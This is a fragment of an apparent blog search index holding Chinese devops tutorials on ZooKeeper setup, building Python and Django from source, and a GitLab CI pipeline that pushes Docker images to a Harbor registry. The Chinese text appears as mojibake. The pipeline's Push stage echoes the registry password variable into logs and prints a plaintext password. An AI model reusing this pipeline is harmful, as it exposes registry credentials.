class=\"o\"\u003e=\u003c/span\u003e172.18.31.51:20881:30881\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eserver.2\u003cspan class=\"o\"\u003e=\u003c/span\u003e172.18.31.52:20881:30881\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæ³¨æ„ä¸Šé¢ï¼Œæˆ‘ä»¬çš„æ•°æ®ç›®å½•æ˜¯åœ¨/data/zookeeperï¼Œæ‰€ä»¥è¦å…ˆå»ºç«‹å¥½ç›®å½•ç»“æ„\u003c/p\u003e\n\u003cp\u003eç„¶åæœ‰ä¸‰å°æœåŠ¡å™¨ä¹ˆï¼ŒæŠŠå„è‡ªçš„idæ”¾åˆ°æ–‡ä»¶ä¸­ï¼Œç„¶å20881æ˜¯ä¸‰å°æœåŠ¡å™¨ä¹‹é—´çš„é€šè®¯ç«¯å£ï¼Œ30881æ˜¯é€‰ä¸¾ç«¯å£\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emkdir /data/zookeeper -p\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"m\"\u003e0\u003c/span\u003e \u0026gt;/data/zookeeper/myid\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eä¸‰å°æœåŠ¡å™¨åˆ†åˆ«å¯åŠ¨\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/usr/local/apache-zookeeper-3.6.3-bin/bin/zkServer.sh start\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eéªŒè¯ä¸€ä¸‹\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/usr/local/apache-zookeeper-3.6.3-bin/bin/zkCli.sh\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003ezk: localhost:2181\u003cspan class=\"o\"\u003e(\u003c/span\u003eCONNECTED\u003cspan class=\"o\"\u003e)\u003c/span\u003e 1\u003cspan class=\"o\"\u003e]\u003c/span\u003e ls /\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003eadmin, brokers, cluster, config, consumers, controller, controller_epoch, feature, isr_change_notification, latest_producer_id_block, log_dir_event_notification, zookeeper\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eçœ‹çœ‹ / ä¸‹æœ‰ä¸œè¥¿å°±è¡Œäº†ï¼Œä¸Šé¢æ˜¯å·²ç»è£…å¥½äº† kafka å’Œ cruisecontrolçš„æƒ…å½¢ï¼Œä¸œè¥¿å°±æ¯”è¾ƒå¤šäº†\u003c/p\u003e","title":"Kafkaçš„å®‰è£…å’ŒéªŒè¯"},{"content":"å…¶å®æœ¬èº«è‡ªå·±æ˜¯æ¯”è¾ƒå–œæ¬¢ javascripts çš„ï¼Œä½†æ˜¯ Python ä¹Ÿæ˜¯å¿…é¡»æŒæ¡çš„ä¸€é¡¹æŠ€èƒ½ã€‚\nå¹² devops ansible è·Ÿ python ä¹Ÿè„±ä¸äº†å¹²ç³»ï¼Œæ‰€ä»¥å‡†å¤‡ç”¨ django å¼€å‘ä¸€ä¸ªè‡ªåŠ¨ä¸Šçº¿çš„ç³»ç»Ÿã€‚\nå…ˆå‡†å¤‡ä¸€ä¸‹ Python ä»¥åŠ Django çš„ç¯å¢ƒå¥½äº†ã€‚\nä¸€ã€å‡†å¤‡ Python ç§˜ç±ï¼Œä¸è¦ç”¨ä»€ä¹ˆ venv ä¹‹ç±»çš„ä¸œè¥¿ï¼Œæ±¡æŸ“ç¯å¢ƒã€‚ç›´æ¥ä¸‹è½½æºä»£ç ç¼–è¯‘å®‰è£…ï¼Œç„¶åæŠŠ py å°åˆ°è‡ªå·±çš„å¯†é—­æ˜¯ç‹é“ï¼Œæœ€åå¼•ç”¨ä¸€ä¸‹ $PATH ï¼Œæƒ³ç”¨å“ªä¸ªå°±ç”¨å“ªä¸ªã€‚\næ³¨æ„ä»¥ä¸‹çš„æ­¥éª¤ï¼Œå…ˆè£… gcc çš„ç¼–è¯‘ç¯å¢ƒï¼Œç„¶åè£… openssl çš„é«˜ç‰ˆæœ¬ï¼Œå¹¶ä¸”é…ç½®å¥½ ldconfigï¼Œå¦åˆ™ py çš„ ssl ä¼šæŠ¥é”™ã€‚\næœ€åä¸‹è½½ python 3.8.15 ç¼–è¯‘å®‰è£…ï¼Œç”Ÿäº§ç¯å¢ƒï¼Œæœ€å¥½é‡‡ç”¨æœ€æ–°ç‰ˆæœ¬å¾€åé”™ä¸¤ä¸ªç‰ˆæœ¬ã€‚\nç¼–è¯‘å®‰è£…åˆ° /export/servers/python3ç›®å½•\nyum -y install zlib-devel bzip2-devel openssl-devel ncurses-devel sqlite-devel readline-devel tk-devel gcc make libffi-devel\rwget https://www.openssl.org/source/openssl-1.1.1q.tar.gz\r./config --prefix=/export/servers/openssl\rvi /etc/ld.so.conf\r/export/servers/openssl/lib\rldconfig -v\rwget https://www.python.org/ftp/python/3.8.15/Python-3.8.15.tgz\r./configure --prefix=/export/servers/python3 --with-openssl=/export/servers/openssl --with-ssl-default-suites=openssl æœ€åä¸€æ­¥ï¼š\nexport $PATH=/export/servers/python3/bin:$PATH è¿™æ ·å°±å®Œæˆäº† python çš„å®‰è£…\näºŒã€é…ç½®Django å…ˆå‡çº§ä¸€ä¸‹pipåˆ°æœ€æ–°ç‰ˆæœ¬\n/export/servers/python3/bin/python3.8 -m pip install --upgrade pip\rpip3 install django\rpip3 install pysqlite3\rpip3 install pysqlite3-binary ä¸ºä»€ä¹ˆè¦è¿™ä¹ˆæï¼Œå› ä¸º django è¦æ±‚ sqlite çš„ç‰ˆæœ¬æ¯”è¾ƒé«˜ï¼Œæ— æ³•å‡çº§ï¼Œå¹²è„†æ¢æ‰å®ƒæ”¹æˆ pysqlite3 å°±å¥½äº†\nvi /export/servers/python3/lib/python3.8/site-packages/django/db/backends/sqlite3/base.py\r#from sqlite3 import dbapi2 as Database\rfrom pysqlite3 import dbapi2 as Database è¿™æ · django çš„ç¯å¢ƒå°±æ­å¥½äº†\n","permalink":"https://rendoumi.com/posts/20221027-python_django/","summary":"\u003cp\u003eå…¶å®æœ¬èº«è‡ªå·±æ˜¯æ¯”è¾ƒå–œæ¬¢ javascripts çš„ï¼Œä½†æ˜¯ Python ä¹Ÿæ˜¯å¿…é¡»æŒæ¡çš„ä¸€é¡¹æŠ€èƒ½ã€‚\u003c/p\u003e\n\u003cp\u003eå¹² devops ansible è·Ÿ python ä¹Ÿè„±ä¸äº†å¹²ç³»ï¼Œæ‰€ä»¥å‡†å¤‡ç”¨ django å¼€å‘ä¸€ä¸ªè‡ªåŠ¨ä¸Šçº¿çš„ç³»ç»Ÿã€‚\u003c/p\u003e\n\u003cp\u003eå…ˆå‡†å¤‡ä¸€ä¸‹ Python ä»¥åŠ Django çš„ç¯å¢ƒå¥½äº†ã€‚\u003c/p\u003e\n\u003ch4 id=\"ä¸€å‡†å¤‡-python\"\u003eä¸€ã€å‡†å¤‡ Python\u003c/h4\u003e\n\u003cp\u003eç§˜ç±ï¼Œä¸è¦ç”¨ä»€ä¹ˆ venv ä¹‹ç±»çš„ä¸œè¥¿ï¼Œæ±¡æŸ“ç¯å¢ƒã€‚ç›´æ¥ä¸‹è½½æºä»£ç ç¼–è¯‘å®‰è£…ï¼Œç„¶åæŠŠ py å°åˆ°è‡ªå·±çš„å¯†é—­æ˜¯ç‹é“ï¼Œæœ€åå¼•ç”¨ä¸€ä¸‹ $PATH ï¼Œæƒ³ç”¨å“ªä¸ªå°±ç”¨å“ªä¸ªã€‚\u003c/p\u003e\n\u003cp\u003eæ³¨æ„ä»¥ä¸‹çš„æ­¥éª¤ï¼Œå…ˆè£… gcc çš„ç¼–è¯‘ç¯å¢ƒï¼Œç„¶åè£… openssl çš„é«˜ç‰ˆæœ¬ï¼Œå¹¶ä¸”é…ç½®å¥½ ldconfigï¼Œå¦åˆ™ py çš„ ssl ä¼šæŠ¥é”™ã€‚\u003c/p\u003e\n\u003cp\u003eæœ€åä¸‹è½½ python 3.8.15 ç¼–è¯‘å®‰è£…ï¼Œç”Ÿäº§ç¯å¢ƒï¼Œæœ€å¥½é‡‡ç”¨æœ€æ–°ç‰ˆæœ¬å¾€åé”™ä¸¤ä¸ªç‰ˆæœ¬ã€‚\u003c/p\u003e\n\u003cp\u003eç¼–è¯‘å®‰è£…åˆ° /export/servers/python3ç›®å½•\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eyum -y install zlib-devel bzip2-devel openssl-devel ncurses-devel sqlite-devel readline-devel tk-devel gcc make libffi-devel\r\n\r\nwget https://www.openssl.org/source/openssl-1.1.1q.tar.gz\r\n./config --prefix=/export/servers/openssl\r\n\r\nvi /etc/ld.so.conf\r\n/export/servers/openssl/lib\r\nldconfig -v\r\n\r\nwget https://www.python.org/ftp/python/3.8.15/Python-3.8.15.tgz\r\n./configure --prefix=/export/servers/python3 --with-openssl=/export/servers/openssl --with-ssl-default-suites=openssl\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eæœ€åä¸€æ­¥ï¼š\u003c/p\u003e","title":"Pythonä¸‹Djangoç¯å¢ƒçš„å‡†å¤‡"},{"content":"Gitlab å’Œ Jenkins ä¸€æ ·ï¼Œéƒ½æ˜¯å¾ˆæµè¡Œçš„ CI/CD å·¥å…·ï¼Œå½“ç„¶ï¼Œæœ¬ç«™ä¹‹å‰æ¨è¿‡å›½äººè‡ªäº§çš„ä¸œè¥¿ onedevï¼Œé‚£ä¸ªä¹Ÿç›¸å½“ä¸é”™ï¼Œä½†æ˜¯ç”¨çš„äººæ¯•ç«Ÿè¿˜æ˜¯å°‘ï¼Œè¿™å›è¿˜æ˜¯ç”¨å¤§å®¶éƒ½è€³ç†Ÿèƒ½è¯¦çš„ä¸œè¥¿ã€‚\næœ¬ç¯‡å°±æ˜¯ Giblab åœ¨ç”Ÿäº§ç¯å¢ƒæ‰“åŒ…å‘å¸ƒçš„ä¸€ä¸ªå…¨æµç¨‹ã€‚\nè§£é‡Šä¸€ä¸‹ä¸Šå›¾ï¼š\né¦–å…ˆæœ‰ä¸¤å¥—Gitï¼Œä¸€å¥—æ˜¯ç¨‹åºå‘˜çš„Codeä»“åº“ï¼Œå¦ä¸€å¥—æ˜¯è¿ç»´çš„æ“ä½œä»£ç ï¼Œé‡Œé¢æ˜¯ä¸€äº›yamlå•Šï¼Œä¸€äº›ansibleè„šæœ¬å•Š\nç„¶åæµç¨‹å°±æ˜¯å…ˆå–å‡ºç¨‹åºå‘˜çš„Codeï¼Œbuildå‡ºæ¥jarï¼Œç„¶åæ‰“æˆé•œåƒæ¨åˆ°ä»“åº“ï¼Œç„¶åå†å–å‡ºè¿ç»´çš„ä»£ç ï¼Œè¿›è¡Œåˆå¹¶ï¼Œç”Ÿæˆk8sçš„yamlæ–‡ä»¶ï¼Œæœ€åæ¨åˆ° kubernetes ä¸­å»ï¼Œè¿™æ ·æ•´ä¸ª GitOPS çš„æµç¨‹å°±å®Œå¤‡äº†\nåœ¨ gitlab ä¸­éå¸¸ç®€å•ï¼Œå°±æ˜¯ç¼–è¾‘ .gitlab-ci.yaml æ–‡ä»¶\nimage: docker:19.03.12 variables: DOCKER_DRIVER: overlay2 DOCKER_TLS_CERTDIR: \u0026#34;\u0026#34; MAVEN_OPTS: \u0026#34;-Dmaven.repo.local=.m2/repository\u0026#34; TIMEZONE: \u0026#34;Asia/Shanghai\u0026#34; http_proxy: \u0026#34;\u0026#34; https_proxy: \u0026#34;\u0026#34; no_proxy: \u0026#34;\u0026#34; cache: paths: - .m2/repository/ - target/ stages: - build - push - deploy Build: stage: build image: maven:3.5-jdk-8-alpine before_script: - export COMMIT_TIME=$(TZ=CST-8 date +%F-%H-%M) - echo $COMMIT_TIME - echo \u0026#34;COMMIT_TIME=$COMMIT_TIME\u0026#34; \u0026gt;\u0026gt; build.env script: - ./mvnw package artifacts: reports: dotenv: build.env tags: - yunwei Push: stage: push before_script: - docker info || true - echo \u0026#34;$HARBOR_REGISTRY $HARBOR_USERNAME $HARBOR_PASSWORD\u0026#34; - echo \u0026#34;echo Dingfangwen | docker login 172.18.31.28 -u dingfangwen --password-stdin\u0026#34; - echo -n $HARBOR_PASSWORD | docker login $HARBOR_REGISTRY -u $HARBOR_USERNAME --password-stdin script: - docker pull $HARBOR_REGISTRY_IMAGE:latest || true - \u0026gt; docker build --cache-from $HARBOR_REGISTRY_IMAGE:latest --build-arg http_proxy=$http_proxy --build-arg https_proxy=$https_proxy --build-arg no_proxy=$no_proxy --cache-from HARBOR_REGISTRY_IMAGE:latest --tag $HARBOR_REGISTRY_IMAGE:$COMMIT_TIME --tag $HARBOR_REGISTRY_IMAGE:latest . - docker push $HARBOR_REGISTRY_IMAGE:$COMMIT_TIME - docker push $HARBOR_REGISTRY_IMAGE:latest - docker logout $HARBOR_REGISTRY dependencies: - Build tags: - yunwei Deploy: stage: deploy cache: {} image: cnych/kustomize:v1.0 script: - echo $COMMIT_TIME - git config --global user.email \u0026#34;gitlab@git.k8s.local\u0026#34; - git config --global user.name \u0026#34;GitLab CI/CD\u0026#34; - git clone git://172.18.31.50:30000/test-k8s.git - cd test-k8s/prod - kustomize edit set image $HARBOR_REGISTRY_IMAGE:$COMMIT_TIME - cat kustomization.yaml - git commit -am \u0026#39;PROD image update\u0026#39; - git push origin master dependencies: - Build tags: - yunwei only: - master when: manual å…ˆä¸ç€æ€¥çœ‹è¿™ä¸ªæ–‡ä»¶ï¼Œå†æ™®åŠä¸€ä¸‹ gitlab çš„è¿è¡Œæœºåˆ¶ï¼Œå®ƒæ˜¯é€šè¿‡ gitlab-runner æ¥æ‰§è¡Œcdçš„è¿‡ç¨‹çš„ã€‚é…ç½®gitlab runnerå…¶å®ä¹Ÿæ˜¯ä¸€é¡¹éå¸¸å¤æ‚çš„å·¥ä½œï¼Œé‡Œé¢å¯ä»¥é…çš„ä¸œè¥¿å¤ªå¤šäº†ï¼Œä¸æ˜¯æœ¬ç¯‡çš„èŒƒç•´ã€‚æˆ‘ä»¬è¿™é‡Œç®€å•æ¥è¯´ï¼Œrunnerå°±æ˜¯ä¸€ä¸ªDockerå®¹å™¨ã€‚æ›´å‡†ç¡®çš„è¯´ï¼Œå°±æ˜¯Docker in Dockerã€‚\nå¥½ï¼Œæ¥ä¸‹æ¥ä¸€æ­¥æ­¥åˆ†ææ•´ä¸ªéƒ¨ç½²æ–‡ä»¶ï¼š\nimage: docker:19.03.12 variables: DOCKER_DRIVER: overlay2 DOCKER_TLS_CERTDIR: \u0026#34;\u0026#34; MAVEN_OPTS: \u0026#34;-Dmaven.repo.local=.m2/repository\u0026#34; TIMEZONE: \u0026#34;Asia/Shanghai\u0026#34; http_proxy: \u0026#34;\u0026#34; https_proxy: \u0026#34;\u0026#34; no_proxy: \u0026#34;\u0026#34; cache: paths: - .m2/repository/ - target/ é¦–å…ˆæŒ‡å®šäº† Build è¿‡ç¨‹ä½¿ç”¨çš„ Docker å®¹å™¨çš„åº•ç‰ˆï¼Œæ˜¯ docker:19.03.12ï¼Œè®¾ç½®äº† MAVEN_OPTS çš„å‚æ•°ï¼Œè¿™ä¸€ç‚¹ä¹Ÿéå¸¸é‡è¦ï¼Œå› ä¸ºæ¯æ¬¡å¯åŠ¨ä¸€ä¸ª Docker ï¼Œåœ¨å®¹å™¨é‡Œè¿è¡Œ mvn build çš„æ—¶å€™ï¼Œä½ ä¸ä¼šæƒ³æ¯æ¬¡éƒ½é‡æ–°ä¸‹è½½æ‰€æœ‰çš„ä¾èµ–åŒ…å§ã€‚\nä¸‹é¢çš„ cache éƒ¨åˆ†ï¼Œè®¾ç½®äº†æ•´ä¸ª build è¿‡ç¨‹ä¸­ä¹ƒè‡³ä»¥åï¼Œéƒ½ä¿ç•™ä¸­é—´äº§ç‰©ã€‚target ç›®å½•ä¸­å­˜æ”¾çš„æ˜¯ build å‡ºæ¥çš„ jar åŒ…ã€‚\nç»§ç»­ï¼Œæ•´ä¸ªéƒ¨ç½²è¿‡ç¨‹åˆ†ä¸‰ä¸ªæ­¥éª¤ï¼Œ1ã€build å‡º jar åŒ…ï¼Œ2ã€æ‰“åŒ…æˆé•œåƒæ¨åˆ°ä»“åº“å»ï¼Œ3ã€æœ€åå‘å¸ƒåˆ°k8så»\nstages: - build - push - deploy é¦–å…ˆç¬¬ä¸€æ­¥ï¼Œbuild jaråŒ…\nBuild: stage: build image: maven:3.5-jdk-8-alpine before_script: - export COMMIT_TIME=$(TZ=CST-8 date +%F-%H-%M) - echo $COMMIT_TIME - echo \u0026#34;COMMIT_TIME=$COMMIT_TIME\u0026#34; \u0026gt;\u0026gt; build.env script: - ./mvnw package artifacts: reports: dotenv: build.env tags: - yunwei å¾ˆç®€å•ï¼Œå…¶å®å°±æ˜¯åˆèµ·äº†ä¸€ä¸ªå®¹å™¨ï¼Œåº•ç‰ˆæ˜¯maven:3.5-jdk-8-alpineï¼Œåœ¨å®¹å™¨é‡Œæ‰§è¡Œäº†ä¸€æ¡å‘½ä»¤ï¼Œ mvnw packageï¼Œè¿™æ¡å‘½ä»¤å¦‚æœæˆåŠŸæ‰§è¡Œï¼Œä¼šåœ¨å½“å‰ç›®å½•ä¸‹æ–°å»ºä¸€ä¸ª target ç›®å½•ï¼Œç”Ÿæˆä¸€ä¸ªjaråŒ…ã€‚\nä¸Šé¢æ¯”è¾ƒè«åçš„åœ°æ–¹æ˜¯è¿™ä¸ªé•œåƒå§ï¼Œå±…ç„¶ä¸æ”¯æŒ date +%Y-%m-%d æ–¹å¼ï¼Œæ‰€ä»¥å…«æˆ’æŸ¥äº†åŠå¤©ï¼Œç”¨äº†ä¸€ä¸ªå·¨åˆ«æ‰­çš„å‘½ä»¤ç”Ÿæˆäº†æ—¶é—´æˆ³ï¼Œç„¶åå‘¢æŠŠè¿™ä¸ªæ—¶é—´æˆ³æ”¾åˆ°ä¸€ä¸ªbuild.envæ–‡ä»¶é‡Œï¼Œç„¶åé€šè¿‡ artifacts äº§ç‰©ï¼ŒæŠŠè¿™ä¸ªæ–‡ä»¶ä»¥ç¯å¢ƒå˜é‡çš„æ–¹å¼ä¼ åˆ°éšåçš„ docker å®¹å™¨é‡Œï¼Œè¿™æ ·å°±å¯ä»¥åœ¨éšåçš„å®¹å™¨é‡Œç”¨ç¯å¢ƒå˜é‡å¼•ç”¨è¿™ä¸ªä¸€å¼€å§‹å°±ç”Ÿæˆçš„æ—¶é—´æˆ³äº†ã€‚\nç¬¬äºŒæ­¥ï¼Œç”Ÿæˆé•œåƒå¹¶pushåˆ°è‡ªå·±çš„harboré•œåƒä»“åº“ä¸­å»\næ³¨æ„ï¼Œç¨‹åºå‘˜çš„æºä»£ç é‡Œæ˜¯æœ‰ Dockerfile è¿™ä¸ªæ–‡ä»¶çš„\nPush: stage: push before_script: - docker info || true - echo \u0026#34;$HARBOR_REGISTRY $HARBOR_USERNAME $HARBOR_PASSWORD\u0026#34; - echo \u0026#34;echo Dingfangwen | docker login 172.18.31.28 -u dingfangwen --password-stdin\u0026#34; - echo -n $HARBOR_PASSWORD | docker login $HARBOR_REGISTRY -u $HARBOR_USERNAME --password-stdin script: - docker pull $HARBOR_REGISTRY_IMAGE:latest || true - \u0026gt; docker build --cache-from $HARBOR_REGISTRY_IMAGE:latest --build-arg http_proxy=$http_proxy --build-arg https_proxy=$https_proxy --build-arg no_proxy=$no_proxy --cache-from HARBOR_REGISTRY_IMAGE:latest --tag $HARBOR_REGISTRY_IMAGE:$COMMIT_TIME --tag $HARBOR_REGISTRY_IMAGE:latest . - docker push $HARBOR_REGISTRY_IMAGE:$COMMIT_TIME - docker push $HARBOR_REGISTRY_IMAGE:latest - docker logout $HARBOR_REGISTRY dependencies: - Build tags: - yunwei ä¸Šé¢å°±æ˜¯åœ¨dockerå®¹å™¨é‡Œbuildä¸€ä¸ªé•œåƒå¹¶æ¨åˆ°æˆ‘ä»¬çš„ç§æœ‰harborä»“åº“172.18.31.28å»ï¼Œè¿™ä¸ªä»“åº“æ˜¯éœ€è¦ç™»å½•éªŒè¯çš„ã€‚\nç„¶å docker build çš„æ—¶å€™åˆæœ‰ä¸€äº›æŠ€å·§ï¼Œdocker æœ¬èº«æ–‡ä»¶æ˜¯åˆ†å±‚çš„ï¼Œ\u0026ndash;cache-from å¯ä»¥åŠ å¿« build çš„è¿‡ç¨‹\nåŒæ ·æˆ‘ä»¬çœ‹åˆ°ç›´æ¥å¼•ç”¨ $COMMIT_TIME å°±å¯ä»¥å¼•ç”¨ç¬¬ä¸€æ­¥ç”Ÿæˆçš„æ—¶é—´æˆ³ï¼Œæ³¨æ„æˆ‘ä»¬æ¨äº†ä¸¤éï¼Œä¿ç•™äº†å†å²æ—¶é—´æˆ³ç‰ˆæœ¬ï¼Œå’Œæœ€æ–°ç‰ˆæœ¬ã€‚\nç»™å‡º Dockerfile çš„å†…å®¹ï¼š\nFROM openjdk:8-jre-alpine\rENV LANG C.UTF-8 ENV LANGUAGE C.UTF-8\rENV LC_ALL C.UTF-8\rEXPOSE 8080\rWORKDIR /apps\rCOPY target/spring-petclinic-2.4.5.jar /apps/app.jar\rRUN echo \u0026#34;Asia/Shanghai\u0026#34; \u0026gt; /etc/timezone\rENTRYPOINT [\u0026#34;java\u0026#34;,\u0026#34;-jar\u0026#34;,\u0026#34;/apps/app.jar\u0026#34;] æœ€åä¸€æ­¥çš„å‘å¸ƒè¿‡ç¨‹ï¼š\nDeploy: stage: deploy cache: {} image: cnych/kustomize:v1.0 script: - echo $COMMIT_TIME - git config --global user.email \u0026#34;gitlab@git.k8s.local\u0026#34; - git config --global user.name \u0026#34;GitLab CI/CD\u0026#34; - git clone git://172.18.31.50:30000/test-k8s.git - cd test-k8s/prod - kustomize edit set image $HARBOR_REGISTRY_IMAGE:$COMMIT_TIME - cat kustomization.yaml - git commit -am \u0026#39;PROD image update\u0026#39; - git push origin master dependencies: - Build tags: - yunwei only: - master when: manual è¿™ä¸ªå°±æ²¡ä»€ä¹ˆè¯´çš„äº†ï¼Œç”¨kustomizeçš„åº•ç‰ˆï¼Œgitä¸‹è½½yamlçš„æ¨¡æ¿æ–‡ä»¶ï¼Œç„¶åç”¨ kustomize å®šåˆ¶åŒ–ï¼Œæœ€åpushåˆ°gité‡Œé¢å»ï¼Œåšå¥½ç‰ˆæœ¬è®°å½•ã€‚ç„¶åkubectl apply -f *.yamlçš„æ­¥éª¤æ²¡æœ‰åšï¼Œå¤§å®¶å¯ä»¥è‡ªå·±åŠ ä¸Šå°±æ²¡æœ‰é—®é¢˜äº†ã€‚\noverï¼Œè¿™å°±æ˜¯ä¸€ä¸ªç”Ÿäº§çš„å®é™…ä¾‹å­ã€‚\n","permalink":"https://rendoumi.com/posts/20221025-gitlab_cicd/","summary":"\u003cp\u003eGitlab å’Œ Jenkins ä¸€æ ·ï¼Œéƒ½æ˜¯å¾ˆæµè¡Œçš„ CI/CD å·¥å…·ï¼Œå½“ç„¶ï¼Œæœ¬ç«™ä¹‹å‰æ¨è¿‡å›½äººè‡ªäº§çš„ä¸œè¥¿ onedevï¼Œé‚£ä¸ªä¹Ÿç›¸å½“ä¸é”™ï¼Œä½†æ˜¯ç”¨çš„äººæ¯•ç«Ÿè¿˜æ˜¯å°‘ï¼Œè¿™å›è¿˜æ˜¯ç”¨å¤§å®¶éƒ½è€³ç†Ÿèƒ½è¯¦çš„ä¸œè¥¿ã€‚\u003c/p\u003e\n\u003cp\u003eæœ¬ç¯‡å°±æ˜¯ Giblab åœ¨ç”Ÿäº§ç¯å¢ƒæ‰“åŒ…å‘å¸ƒçš„ä¸€ä¸ªå…¨æµç¨‹ã€‚\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"1666673866024\" loading=\"lazy\" src=\"/posts/20221025-gitlab_cicd/1666673866024.png\"\u003e\u003c/p\u003e\n\u003cp\u003eè§£é‡Šä¸€ä¸‹ä¸Šå›¾ï¼š\u003c/p\u003e\n\u003cp\u003eé¦–å…ˆæœ‰ä¸¤å¥—Gitï¼Œä¸€å¥—æ˜¯ç¨‹åºå‘˜çš„Codeä»“åº“ï¼Œå¦ä¸€å¥—æ˜¯è¿ç»´çš„æ“ä½œä»£ç ï¼Œé‡Œé¢æ˜¯ä¸€äº›yamlå•Šï¼Œä¸€äº›ansibleè„šæœ¬å•Š\u003c/p\u003e\n\u003cp\u003eç„¶åæµç¨‹å°±æ˜¯å…ˆå–å‡ºç¨‹åºå‘˜çš„Codeï¼Œbuildå‡ºæ¥jarï¼Œç„¶åæ‰“æˆé•œåƒæ¨åˆ°ä»“åº“ï¼Œç„¶åå†å–å‡ºè¿ç»´çš„ä»£ç ï¼Œè¿›è¡Œåˆå¹¶ï¼Œç”Ÿæˆk8sçš„yamlæ–‡ä»¶ï¼Œæœ€åæ¨åˆ° kubernetes ä¸­å»ï¼Œè¿™æ ·æ•´ä¸ª GitOPS çš„æµç¨‹å°±å®Œå¤‡äº†\u003c/p\u003e\n\u003cp\u003eåœ¨ gitlab ä¸­éå¸¸ç®€å•ï¼Œå°±æ˜¯ç¼–è¾‘ .gitlab-ci.yaml æ–‡ä»¶\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-yaml\" data-lang=\"yaml\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003eimage\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003edocker:19.03.12\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"nt\"\u003evariables\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003eDOCKER_DRIVER\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003eoverlay2\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003eDOCKER_TLS_CERTDIR\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003eMAVEN_OPTS\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;-Dmaven.repo.local=.m2/repository\u0026#34;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003eTIMEZONE\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Asia/Shanghai\u0026#34;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003ehttp_proxy\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e\u003cspan 